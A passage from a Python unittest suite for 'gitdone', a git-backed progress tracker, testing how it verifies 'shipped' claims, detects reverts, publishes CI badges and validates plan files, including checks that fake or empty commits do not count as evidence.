        stdin = io.StringIO('{"id":1,"method":"tools/call","params":["x"]}\n{"id":2,"method":"ping"}\n')
        stdout = io.StringIO()
        mcp.serve(stdin, stdout)
        self.assertEqual(json.loads(stdout.getvalue().splitlines()[1])["id"], 2)

    def test_one_broken_project_keeps_the_page(self):
        (self.project / ".gitdone.json").write_text(json.dumps({"plan": "plan.json"}))
        self.table_path.write_text("### 1. A (1)\n\n| 1 | a | Not built | |\n")
        with mock.patch.object(portfolio, "_numbers", side_effect=TypeError("broken")):
            found = portfolio.scan([self.tmp])
        self.assertIn("could not run: TypeError", found[0]["error"])


class Numbers(unittest.TestCase):
    def test_nearly_done_does_not_read_as_done(self):
        self.assertEqual(render.pct(199 / 200), "99%")
        self.assertEqual(render.pct(1), "100%")
        self.assertEqual(render.bar(39 / 40).count("█"), 19)
        self.assertEqual(render.bar(1).count("█"), 20)

    def test_something_does_not_read_as_nothing(self):
        self.assertEqual(render.pct(1 / 201), "1%")
        self.assertEqual(render.pct(0), "0%")


class Scaffolding(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.dir = pathlib.Path(self._tmp.name).resolve()

    def test_a_heading_with_a_hash_keeps_it(self):
        self.assertEqual(scaffold.sections_from_checklist("## C#\n- [ ] A\n")[0].name, "C#")
        self.assertEqual(scaffold.sections_from_checklist("## Closed ##\n- [ ] A\n")[0].name, "Closed")

    def test_a_tilde_fence_inside_a_backtick_fence_does_not_end_it(self):
        sections = scaffold.sections_from_checklist("```\n~~~\n- [ ] Example\n```\n- [ ] Real\n")
        self.assertEqual([r[0] for s in sections for r in s.rows], ["Real"])

    def test_a_heading_with_a_year_makes_a_table_that_can_be_read(self):
        with mock.patch.dict(os.environ, {"HOME": str(self.dir / "elsewhere")}):
            sections = scaffold.sections_from_checklist("## Launch (2026)\n- [ ] A\n- [ ] B\n")
            path, _ = scaffold.create(self.dir, sections=sections)
        table = tables.load_clean(Plan(path))
        self.assertEqual(len(table.rows), 2)

    def test_init_in_the_home_directory_is_refused(self):
        with mock.patch.dict(os.environ, {"HOME": str(self.dir), "USERPROFILE": str(self.dir)}):
            from gitdone.plan import PlanError
            with self.assertRaisesRegex(PlanError, "not a project"):
                scaffold.create(self.dir)

    def test_agents_keeps_a_files_line_ends(self):
        path = self.dir / "AGENTS.md"
        path.write_bytes(b"# Ours\r\n\r\nRules.\r\n")
        scaffold.install_agents(self.dir)
        data = path.read_bytes()
        self.assertEqual(data.count(b"\n"), data.count(b"\r\n"))

    def test_inverted_markers_delete_nothing(self):
        path = self.dir / "AGENTS.md"
        text = f"a\n{scaffold.AGENTS_END}\nkeep me\n{scaffold.AGENTS_START}\nb\n"
        path.write_text(text)
        scaffold.install_agents(self.dir)
        self.assertIn("keep me", path.read_text())


class Views(ProjectCase):
    def test_a_title_with_a_newline_keeps_the_date_on_the_first_line(self):
        self.change_plan(title="Two\nlines")
        self.assertTrue(self.view_path.read_text().startswith("# Two lines (generated "))


class Histories(ProjectCase):
    def setUp(self):
        super().setUp()
        self.change_plan(release=None)
        git(self.project, "init", "-q", "-b", "main")

    def commit_at(self, author, landed=None, message="x"):
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", message,
            env={"GIT_AUTHOR_DATE": f"{author}T12:00:00", "GIT_COMMITTER_DATE": f"{landed or author}T12:00:00"})

    def test_a_commit_authored_early_and_landed_late_still_ends_the_chart(self):
        from gitdone import chart
        self.commit_at("2026-03-01")
        self.set_row(11, "Partial", "words")
        self.commit_at("2026-03-25")
        self.set_row(10, "Live", f"`{self.sha_main[:7]}`")
        self.commit_at("2026-03-20", landed="2026-03-26", message="rebased")
        items = chart.points(self.plan())
        last = tables.counts(tables.load_clean(self.plan()).rows.values(), self.plan().kind_names)["Live"]
        self.assertEqual(items[-1]["strict"], last)

    def test_the_week_counts_it_from_when_it_landed(self):
        self.commit_at("2026-03-01")
        self.set_row(11, "Partial", "words")
        self.commit_at("2026-03-25")
        self.set_row(10, "Live", f"`{self.sha_main[:7]}`")
        self.commit_at("2026-03-20", landed="2026-03-26", message="rebased")
        code, out, err = self.cli("week", "2026-03-22")
        self.assertEqual(code, 0, err)
        self.assertIn("11 Not built→Partial", out)

    def test_forward_dates_only_ever_move_forward(self):
        self.assertEqual(history.forward_dates([("c", "2026-01-05"), ("b", "2026-01-09"), ("a", "2026-01-01")]),
                         [("c", "2026-01-09"), ("b", "2026-01-09"), ("a", "2026-01-01")])

    def test_a_table_in_a_folder_with_another_alphabet(self):
        from gitdone import chart
        folder = self.project / "доки"
        folder.mkdir()
        shutil.move(str(self.table_path), str(folder / "статус.md"))
        data = json.loads(self.plan_path.read_text())
        data["status_doc"] = "доки/статус.md"
        self.plan_path.write_text(json.dumps(data))
        self.write_view()
        self.commit_at("2026-03-01")
        self.assertEqual(self.cli("week")[0], 0)
        self.assertEqual(len(chart.points(self.plan())), 1)

    def test_week_from_a_commit_that_did_not_touch_a_renamed_table(self):
        self.commit_at("2026-03-01")
        (self.project / "other.txt").write_text("x\n")
        self.commit_at("2026-03-02")
        base = git(self.project, "rev-parse", "HEAD")
        git(self.project, "mv", "status-table.md", "table.md")
        data = json.loads(self.plan_path.read_text())
        data["status_doc"] = "table.md"
        self.plan_path.write_text(json.dumps(data))
        self.write_view()
        self.commit_at("2026-03-03")
        code, _, err = self.cli("week", base)
        self.assertEqual(code, 0, err)


class ConcurrentWriters(ProjectCase):
    def test_a_table_that_changed_under_a_move_is_not_overwritten(self):
        plan = self.plan()
        text = self.table_path.read_text()
        self.table_path.write_text(text.replace("Staff override", "Staff override changed"))
        changed = self.table_path.read_text()
        with self.assertRaisesRegex(shipped.Refused, "changed while this was being checked"):
            shipped.save(plan, text, text)
        self.assertEqual(self.table_path.read_text(), changed)


class Publishing(ProjectCase):
    def setUp(self):
        super().setUp()
        self.change_plan(release=None, repo=".")
        self.remote = self.tmp / "remote.git"
        subprocess.run(["git", "init", "-q", "--bare", str(self.remote)], env=clean_env(), check=True)
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "remote", "add", "origin", str(self.remote))
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")

    def remote_git(self, *args):
        return subprocess.run(["git", "--git-dir", str(self.remote), *args], capture_output=True, text=True, env=clean_env())

    def run_ci(self, *args, ref="main"):
        event = self.tmp / "event.json"
        event.write_text("{}")
        with mock.patch.dict(os.environ, {"GITHUB_EVENT_PATH": str(event), "GITHUB_REF_NAME": ref}):
            return self.cli("ci", "--no-comment", *args)

    def test_a_branch_keeps_what_it_held(self):
        from gitdone import ci
        git(self.project, "checkout", "-q", "--orphan", "pages")
        git(self.project, "rm", "-rfq", ".")
        (self.project / "index.html").write_text("<html>\n")
        (self.project / "assets").mkdir()
        (self.project / "assets" / "a.css").write_text("a\n")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "site")
        git(self.project, "push", "-q", "origin", "pages")
        git(self.project, "checkout", "-q", "main")
        self.assertEqual(ci.publish(self.project, "pages", {"badge.svg": "<svg/>\n"}, "status"), "published to pages")
        names = self.remote_git("ls-tree", "-r", "--name-only", "pages").stdout.split()
        self.assertEqual(sorted(names), ["assets/a.css", "badge.svg", "index.html"])

    def test_the_default_branch_is_refused(self):
        git(self.project, "push", "-q", "origin", "main")
        before = self.remote_git("rev-parse", "main").stdout
        _, out, _ = self.run_ci("--publish", "main")
        self.assertIn("refusing to publish onto main", out)
        self.assertEqual(self.remote_git("rev-parse", "main").stdout, before)

    def test_a_push_to_another_branch_does_not_publish(self):
        _, out, _ = self.run_ci("--publish", "badges", ref="feature")
        self.assertIn("not publishing from feature", out)
        self.assertNotEqual(self.remote_git("rev-parse", "--verify", "-q", "badges").returncode, 0)

    def test_a_push_to_the_default_branch_does(self):
        _, out, _ = self.run_ci("--publish", "badges")
        self.assertIn("published to badges", out)

    def test_a_dash_is_not_a_branch(self):
        from gitdone import ci
        self.assertIn("cannot be a branch name", ci.publish(self.project, "--force", {"a": "b\n"}, "x"))

    def test_a_failure_to_publish_does_not_change_the_gates_answer(self):
        from gitdone import chart
        expected = self.run_ci()[0]
        with mock.patch.object(chart, "points", side_effect=shipped.PlanError("no history")):
            code, out, _ = self.run_ci("--publish", "badges")
        self.assertEqual(code, expected, out)
        self.assertIn("could not publish", out)


class AnInitBeforeGitInit(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.dir = pathlib.Path(self._tmp.name).resolve() / "p"
        self.dir.mkdir()
        self.home = self.dir.parent / "home"
        self.home.mkdir()

    def engine(self, *args):
        return subprocess.run([sys.executable, str(ENGINE), *args], cwd=str(self.dir), capture_output=True, text=True, encoding="utf-8",
                              stdin=subprocess.DEVNULL, env={**clean_env(), "HOME": str(self.home), "USERPROFILE": str(self.home)})

    def test_evidence_starts_working_the_moment_git_does(self):
        self.engine("init", "--rows", "A")
        done = self.engine("shipped", "1", "deadbee1")
        self.assertEqual(done.returncode, 1, "nothing here could check it")
        self.assertIn("not a git repository yet", done.stderr)
        self.assertEqual(self.engine("check", "--strict").returncode, 0)
        git(self.dir, "init", "-q", "-b", "main")
        sha = commit(self.dir, "a.txt", "1\n", "first")
        self.assertEqual(self.engine("shipped", "1", "deadbee1").returncode, 1)
        done = self.engine("shipped", "1", sha[:7])
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("verified", done.stdout)


class ClaimsThatHoldInNameOnly(ProjectCase):
    """A commit that exists and is on the branch can still say nothing. Each of these was a one-line way past the gate."""

    def settle(self):
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")

    def test_a_tag_named_like_a_commit_id_is_not_that_commit(self):
        git(self.app, "tag", self.sha_stray[:7], self.sha_main)
        self.set_row(10, "Live", f"`{self.sha_stray[:7]}`")
        code, out, _ = self.cli("check", "--offline")
        self.assertEqual(code, 1, out)
        self.assertIn("is not on main", out)

    def test_a_made_up_id_with_a_tag_of_that_name_is_nothing(self):
        git(self.app, "tag", "deadbee", self.sha_main)
        code, _, err = self.cli("shipped", "10", "deadbee", "--offline")
        self.assertEqual(code, 1, err)

    def test_a_tag_named_like_a_true_id_does_not_fail_the_row(self):
        git(self.app, "tag", self.sha_main[:7], self.sha_stray)
        self.set_row(10, "Live", f"`{self.sha_main[:7]}`")
        self.settle()
        self.assertEqual(self.cli("check", "--offline", "--strict")[0], 0)

    def test_a_branch_named_like_a_commit_id_is_not_that_commit(self):
        git(self.app, "branch", "deadbee", self.sha_main)
        self.assertEqual(self.cli("shipped", "10", "deadbee", "--offline")[0], 1)

    def test_an_empty_commit_is_no_evidence(self):
        git(self.app, "commit", "-q", "--allow-empty", "-m", "Sign-in is done")
        sha = git(self.app, "rev-parse", "HEAD")
        code, _, err = self.cli("shipped", "10", sha[:7], "--offline")
        self.assertEqual(code, 1, err)
        self.assertIn("changes no file", err)

    def test_the_trackers_own_commit_is_no_evidence(self):
        self.change_plan(repo=".")
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "tracker")
        sha = git(self.project, "rev-parse", "HEAD")
        (self.project / "code.txt").write_text("x\n")
        git(self.project, "add", "code.txt")
        git(self.project, "commit", "-q", "--no-verify", "-m", "code")
        self.table_path.write_text(self.table_path.read_text())
        self.set_row(9, "Partial", "x")
        self.write_view()
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "only the tracker")
        only_tracker = git(self.project, "rev-parse", "HEAD")
        code, _, err = self.cli("shipped", "10", only_tracker[:7], "--offline")
        self.assertEqual(code, 1, err)
        self.assertIn("only changes the tracker", err)
        self.assertTrue(sha)

    def test_a_merge_that_took_none_of_the_changes_is_no_evidence(self):
        git(self.app, "merge", "-q", "-s", "ours", "--no-edit", "stray")
        code, _, err = self.cli("shipped", "10", self.sha_stray[:7], "--offline")
        self.assertEqual(code, 1, err)
        self.assertIn("a merge that took none of its changes", err)

    def test_a_real_merge_is_evidence(self):
        git(self.app, "merge", "-q", "--no-ff", "--no-edit", "stray")
        code, _, err = self.cli("shipped", "10", self.sha_stray[:7], "--offline")
        self.assertEqual(code, 0, err)

    def test_an_empty_commit_with_revert_words_reverts_nothing(self):
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        self.settle()
        git(self.app, "commit", "-q", "--allow-empty", "-m", f"Update docs\n\nThis reverts commit {feature}.")
        self.assertEqual(self.cli("check", "--offline", "--strict")[0], 0)

    def test_an_empty_commit_cannot_bring_a_reverted_claim_back(self):
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        git(self.app, "revert", "--no-edit", feature)
        undoing = git(self.app, "rev-parse", "HEAD")
        git(self.app, "commit", "-q", "--allow-empty", "-m", f"Nothing to see\n\nThis reverts commit {undoing}.")
        self.assertEqual(self.cli("check", "--offline")[0], 1)

    def test_a_sentence_that_starts_with_the_words_is_not_a_revert(self):
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        self.settle()
        commit(self.app, "g.txt", "x\n", f"Thought about it\n\nThis reverts commit {feature}, or it would have.")
        self.assertEqual(self.cli("check", "--offline", "--strict")[0], 0)

    def test_a_commit_that_names_itself_reverts_nothing(self):
        from gitdone.evidence import Verifier
        verifier = Verifier(self.plan(), offline=True)
        verifier.tips()
        body = f"Oops\n\nThis reverts commit {self.sha_main}.\n"
        with mock.patch.object(Verifier, "_real_reverts", return_value=[(self.sha_main, body)]):
            self.assertIsNone(verifier.undone_by(self.sha_main))

    def test_a_chain_of_reverts_is_read_link_by_link(self):
        feature = commit(self.app, "f.txt", "x\n", "Add the feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        latest = feature
        for link in range(1, 13):
            git(self.app, "revert", "--no-edit", latest)
            latest = git(self.app, "rev-parse", "HEAD")
            self.assertEqual(self.cli("check", "--offline")[0], 1 if link % 2 else 0, f"after {link} reverts")

    def test_a_revert_after_a_rebase_is_found_by_its_subject(self):
        feature = commit(self.app, "f.txt", "x\n", "Add the feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        (self.app / "f.txt").unlink()
        git(self.app, "add", "-A")
        git(self.app, "commit", "-q", "-m", 'Revert "Add the feature"\n\nThis reverts commit ' + "c" * 40 + ".")
        self.assertEqual(self.cli("check", "--offline")[0], 1)

    def test_a_revert_in_git_squash_indentation_is_found(self):
        feature = commit(self.app, "f.txt", "x\n", "Add the feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        (self.app / "f.txt").unlink()
        git(self.app, "add", "-A")
        git(self.app, "commit", "-q", "-m", f"Squashed commit\n\ncommit abc\n\n    Revert\n\n    This reverts commit {feature}.")
        self.assertEqual(self.cli("check", "--offline")[0], 1)

    def test_a_control_character_in_a_subject_does_not_hide_a_revert(self):
        feature = commit(self.app, "f.txt", "x\n", "Add the feature")
        self.set_row(10, "Live", f"`{feature[:7]}`")
        (self.app / "f.txt").unlink()
        git(self.app, "add", "-A")
        git(self.app, "commit", "-q", "-m", f"Revert \x01 it\n\nThis reverts commit {feature}.")
        self.assertEqual(self.cli("check", "--offline")[0], 1)


class TheDefaultBranchIsTheRemotes(ProjectCase):
    def with_origin(self):
        origin = self.tmp / "origin.git"
        subprocess.run(["git", "clone", "-q", "--bare", str(self.app), str(origin)], env=clean_env(), check=True)
        git(self.app, "remote", "add", "origin", str(origin))
        git(self.app, "fetch", "-q", "origin")

    def test_a_commit_only_on_local_main_has_not_shipped(self):
        self.with_origin()
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        code, _, err = self.cli("shipped", "10", feature[:7], "--offline")
        self.assertEqual(code, 1, err)
        self.assertIn("is on your local main and not on origin/main; push it", err)

    def test_pushed_it_has(self):
        self.with_origin()
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        git(self.app, "push", "-q", "origin", "main")
        self.assertEqual(self.cli("shipped", "10", feature[:7], "--offline")[0], 0)

    def test_a_hand_made_remote_ref_does_not_count(self):
        git(self.app, "update-ref", "refs/remotes/evil/main", self.sha_stray)
        code, _, err = self.cli("shipped", "10", self.sha_stray[:7], "--offline")
        self.assertEqual(code, 1, err)

    def test_a_forks_revert_does_not_touch_a_claim_true_here(self):
        self.with_origin()
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        git(self.app, "push", "-q", "origin", "main")
        git(self.app, "checkout", "-q", "-b", "w")
        git(self.app, "revert", "--no-edit", feature)
        work = git(self.app, "rev-parse", "HEAD")
        git(self.app, "checkout", "-q", "main")
        git(self.app, "branch", "-q", "-D", "w")
        git(self.app, "update-ref", "refs/remotes/fork/main", work)
        self.set_row(10, "Live", f"`{feature[:7]}`")
        self.assertEqual(self.cli("check", "--offline")[0], 0)

    def test_a_merged_pull_request_whose_commit_left_main_is_a_contradiction(self):
        needs_sh(self)
        self.with_origin()
        feature = commit(self.app, "f.txt", "x\n", "Feature")
        git(self.app, "push", "-q", "origin", "main")
        self.fake_gh(prs=[{"number": 12, "state": "MERGED", "baseRefName": "main"}, {"number": 40, "state": "MERGED", "baseRefName": "main", "mergeCommit": {"oid": feature}}])
        self.set_row(9, "Live", "PR #40")
        git(self.app, "reset", "-q", "--hard", "HEAD~1")
        git(self.app, "push", "-q", "-f", "origin", "main")
        code, out, _ = self.cli("check")
        self.assertEqual(code, 1, out)
        self.assertIn("says merged, and its commit", out)

    def test_a_made_up_merge_commit_is_not_verified(self):
        needs_sh(self)
        self.with_origin()
        self.fake_gh(prs=[{"number": 12, "state": "MERGED", "baseRefName": "main"}, {"number": 40, "state": "MERGED", "baseRefName": "main", "mergeCommit": {"oid": "1" * 40}}])
        self.set_row(9, "Live", "PR #40")
        self.assertEqual(self.cli("check", "--strict")[0], 3)

    def test_the_default_branch_is_no_work_in_progress(self):
        self.set_row(3, "Built, not live (main)", "")
        self.assertEqual(self.cli("check", "--offline")[0], 1)


class ThePlanSetsTheRules(ProjectCase):
    def test_the_strict_kind_must_ask_for_a_release(self):
        data = json.loads(self.plan_path.read_text())
        data["kinds"] = [{"name": "Live", "weight": 1.0}, {"name": "Not built", "weight": 0}]
        self.plan_path.write_text(json.dumps(data))
        code, out, _ = self.cli("check", "--offline")
        self.assertEqual(code, 1, out)
        self.assertIn('so it must have "evidence": "release"', out)

    def test_a_misspelled_key_in_a_kind_is_refused(self):
        data = json.loads(self.plan_path.read_text())
        data["kinds"][0]["evidance"] = "release"
        self.plan_path.write_text(json.dumps(data))
        code, _, err = self.cli("check", "--offline")
        self.assertEqual(code, 2)
        self.assertIn("unknown key 'evidance'", err)

    def test_a_key_given_twice_is_refused(self):
        self.plan_path.write_text('{"status_doc": "status-table.md", "default_branch": "main", "default_branch": "spike"}')
        code, _, err = self.cli("check", "--offline")
        self.assertEqual(code, 2)
        self.assertIn("gives 'default_branch' twice", err)

    def test_a_plan_needs_two_kinds(self):
        data = json.loads(self.plan_path.read_text())
        data["kinds"] = [{"name": "Live", "weight": 1.0, "evidence": "release"}]
        self.plan_path.write_text(json.dumps(data))
        code, out, _ = self.cli("check", "--offline")
        self.assertEqual(code, 1, out)
        self.assertIn("at least two kinds", out)

    def test_a_ref_group_cannot_name_a_moving_reference(self):
        self.change_plan(evidence_pattern=r"(?P<ref>\bHEAD\b)")
        code, _, err = self.cli("shipped", "10", "HEAD", "--offline")
        self.assertEqual(code, 1, err)
        self.assertIn("is not a tag", err)

    def test_a_ref_group_can_name_a_tag(self):
        git(self.app, "tag", "deploy-7", self.sha_main)
        self.change_plan(evidence_pattern=r"deploy (?P<ref>deploy-\d+)")
        code, _, err = self.cli("shipped", "10", "deploy deploy-7", "--offline")
        self.assertEqual(code, 0, err)

    def test_a_symlinked_table_is_refused(self):
        real = self.project / "real.md"
        real.write_text(self.table_path.read_text())
        self.table_path.unlink()
        self.table_path.symlink_to(real)
        code, _, err = self.cli("check", "--offline")
        self.assertEqual(code, 2)
        self.assertIn("symbolic link", err)

    def test_a_table_behind_a_symlinked_folder_is_refused(self):
        outside = self.tmp / "outside"
        outside.mkdir()
        (outside / "t.md").write_text(self.table_path.read_text())
        (self.project / "docs").symlink_to(outside)
        data = json.loads(self.plan_path.read_text())
        data["status_doc"] = "docs/t.md"
        self.plan_path.write_text(json.dumps(data))
        code, _, err = self.cli("check", "--offline")
        self.assertEqual(code, 2)
        self.assertIn("symbolic link", err)

    def test_a_release_the_view_names_answers_to_the_same_rules(self):
        self.change_plan(release="v2.0, all of it, `deadbee`")
        code, out, _ = self.cli("check", "--offline")
        self.assertIn("the plan's release: commit deadbee", out)
        self.assertEqual(code, 0)

    def test_a_workstream_with_no_rows_is_not_finished(self):
        self.change_plan(workstreams=[{"id": "W1", "name": "All of it", "state": "done"}], order=["W1"], sections=None, products=None)
        plan = self.plan()
        self.assertIn("next: W1", render.opener(plan, tables.load_clean(plan)))


class TheHookSaysWhenTheRulesMove(ProjectCase):
    def test_a_commit_that_changes_the_gates_rules_is_told_so(self):
        needs_sh(self)
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        self.change_plan(repo=str(self.app))
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        self.cli("install-hook", "--lenient")
        data = json.loads(self.plan_path.read_text())
        data["rows_total"] = 16
        data["kinds"][0]["weight"] = 0.9
        self.plan_path.write_text(json.dumps(data))
        self.write_view()
        git(self.project, "add", "-A")
        done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "x"], cwd=str(self.project), env=clean_env(), capture_output=True, text=True)
        self.assertIn("this changes the gate's own rules: kinds: Live: weight 1.0 to 0.9", done.stdout + done.stderr)


class TheLine(ProjectCase):
    def test_the_headline_says_when_a_claim_has_no_proof(self):
        code, out, _ = self.cli("opener")
        self.assertIn("no proof behind", out)

    def test_a_row_renamed_under_its_number_is_said(self):
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        base = git(self.project, "rev-parse", "HEAD")
        self.table_path.write_text(self.table_path.read_text().replace("| 11 | Account notices |", "| 11 | Something easy |"))
        self.write_view()
        _, out, _ = self.cli("week", base)
        self.assertIn("Renamed: 11 (Account notices → Something easy)", out)

    def test_many_spaces_after_pr_do_not_take_long(self):
        from gitdone import evidence
        self.assertEqual(evidence.find_prs("PR" + " " * 100000 + "x"), [])
        self.assertEqual(evidence.find_shas(" ".join(f"{i:07x}a" for i in range(5000)))[:1], ["0000000a"])

    def test_several_pull_requests_in_a_list_are_all_read(self):
        from gitdone import evidence
        self.assertEqual(evidence.find_prs("PRs #12 and #13, 14"), [12, 13, 14])

    def test_a_word_that_only_starts_like_mr_is_not_one(self):
        from gitdone import evidence
        self.assertEqual(evidence.find_mrs("Reviewed by Mrs 5 on Tuesday"), [])
        self.assertEqual(evidence.find_mrs("MR 5, merge request !6"), [5, 6])

    def test_a_note_of_only_invisible_characters_is_no_note(self):
        self.set_row(4, "Partial", "\u200b")
        code, out, _ = self.cli("check", "--offline")
        self.assertIn("row 4 has no note", out)

    def test_a_bare_word_beside_a_claim_that_holds_is_only_a_note(self):
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}` see deadbee1.py, flag defaced")
        code, out, _ = self.cli("check", "--offline", "--strict")
        self.assertEqual(code, 0, out)
        self.assertIn("NOTE row 9: commit deadbee1", out)

    def test_a_quoted_id_beside_a_claim_that_holds_is_not(self):
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}` and `deadbee`")
        self.assertEqual(self.cli("check", "--offline", "--strict")[0], 3)

    def test_a_table_not_in_utf8_is_refused_by_the_hook_too(self):
        needs_sh(self)
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        self.cli("install-hook")
        self.table_path.write_bytes(self.table_path.read_bytes().replace(b"Staff override", b"Staff overrid\xe9"))
        git(self.project, "add", "-A")
        done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "x"], cwd=str(self.project), env=clean_env(), capture_output=True, text=True)
        self.assertNotEqual(done.returncode, 0)
        self.assertIn("is not UTF-8", done.stderr)

    def test_a_plan_broken_in_the_commit_history_does_not_wave_a_table_through(self):
        needs_sh(self)
        self.set_row(2, "Live", f"`{self.sha_old[:7]}`")
        self.set_row(9, "Live", f"`{self.sha_main[:7]}`")
        git(self.project, "init", "-q", "-b", "main")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "first")
        self.cli("install-hook")
        self.plan_path.write_text("{")
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "--no-verify", "-m", "break the plan")
        self.table_path.write_text(self.table_path.read_text().replace("Staff override", "Staff override changed"))
        git(self.project, "add", "-A")
        done = subprocess.run(["git", *IDENTITY, "commit", "-q", "-m", "x"], cwd=str(self.project), env=clean_env(), capture_output=True, text=True)
        self.assertNotEqual(done.returncode, 0)


if __name__ == "__main__":
    unittest.main()
